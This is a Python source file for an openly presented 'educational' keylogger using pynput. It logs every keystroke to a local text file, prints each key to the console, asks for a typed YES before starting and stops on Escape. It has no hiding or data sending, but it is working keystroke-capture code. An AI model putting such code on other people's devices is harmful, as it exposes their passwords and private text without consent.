from pynput import keyboard
from datetime import datetime
import os


# --------------------------------------------------
#   Simple Keylogger
#   This program records keystrokes and saves them
#   to a text file for educational purposes only.
#
#   DISCLAIMER: Only use this on your own device
#   with full knowledge and consent. Unauthorized
#   keylogging is illegal and unethical.
# --------------------------------------------------


LOG_FILE = "keylog.txt"
key_count = 0


def write_to_log(text):
    # Open the log file and add the keystroke to it
    # We use append mode so nothing gets overwritten
    with open(LOG_FILE, "a") as f:
        f.write(text)


def on_press(key):
    # This function runs every time a key is pressed
    # We figure out what key it was and save it
    global key_count
    key_count += 1

    try:
        # Regular keys like letters and numbers
        char = key.char
        write_to_log(char)
        print(f"   Key pressed : {char}")

    except AttributeError:
        # Special keys like Space, Enter, Backspace
        if key == keyboard.Key.space:
            write_to_log(" ")
            print("   Key pressed : [Space]")

        elif key == keyboard.Key.enter:
            write_to_log("\n[Enter]\n")
            print("   Key pressed : [Enter]")

        elif key == keyboard.Key.backspace:
            write_to_log("[Backspace]")
            print("   Key pressed : [Backspace]")

        elif key == keyboard.Key.tab:
            write_to_log("[Tab]")
            print("   Key pressed : [Tab]")

        else:
            # Any other special key
            write_to_log(f"[{key}]")
            print(f"   Key pressed : [{key}]")


def on_release(key):
    # This function runs every time a key is released
    # If the user presses Escape, we stop the logger
    if key == keyboard.Key.esc:
        print("\n" + "=" * 50)
        print("   Keylogger stopped by user.")
        print(f"   Total keys captured : {key_count}")
        print(f"   Log saved to        : {os.path.abspath(LOG_FILE)}")
        print("=" * 50)
        return False  # Returning False stops the listener


def main():
    print("=" * 50)
    print("         SIMPLE KEYLOGGER")
    print("   For Educational Purposes Only")
    print("=" * 50)
    print("\nWARNING: Only use this on your own device.")
    print("Unauthorized keylogging is illegal.")
    print("\nThis program will record every key you press")
    print("and save it to a file called keylog.txt")
    print("\nPress Escape at any time to stop.\n")

    confirm = input("Type YES to start the keylogger: ").strip()

    if confirm.upper() != "YES":
        print("\nKeylogger was not started. Goodbye!")
        return

    # Write the session start time to the log file
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_to_log(f"\n\n=== Session Started: {timestamp} ===\n")

    print("\n" + "=" * 50)
    print("   Keylogger is now running...")
    print("   All keystrokes are being saved to keylog.txt")
    print("   Press Escape to stop")
    print("=" * 50 + "\n")

    # Start listening for keystrokes
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()


if __name__ == "__main__":
    main()